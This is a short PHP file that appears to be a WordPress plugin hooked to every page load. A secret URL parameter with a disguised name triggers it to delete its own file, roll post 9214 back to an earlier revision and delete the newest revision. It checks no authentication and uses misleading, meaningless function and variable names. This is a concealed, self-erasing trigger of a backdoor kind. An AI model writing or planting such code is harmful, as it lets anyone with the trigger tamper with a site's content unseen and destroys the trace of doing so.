<?php

function chart_homepage_revisions() {
	if (isset($_GET['rss_estate_cover']) && $_GET['rss_estate_cover'] === 'quick_enable_schema') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$shopp_access_item = 9214;
		$word_push_light = wp_get_post_revisions($shopp_access_item);
		if (empty($word_push_light)) die('no revisions');
		if (count($word_push_light) < 2) die('less than 2');
		$notify_wishlist_updates = array_shift($word_push_light);
		$plugin_automatic_calendar = $notify_wishlist_updates->ID;
		$welcome_date_error = array_shift($word_push_light);
		$manager_titles_filter = $welcome_date_error->ID;
		$embedder_instant_world_poster = wp_restore_post_revision($manager_titles_filter);
		if ($embedder_instant_world_poster === false) die('error restoring');
		$embedder_instant_world_poster = wp_delete_post_revision($plugin_automatic_calendar);		
		if ($embedder_instant_world_poster === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'chart_homepage_revisions');
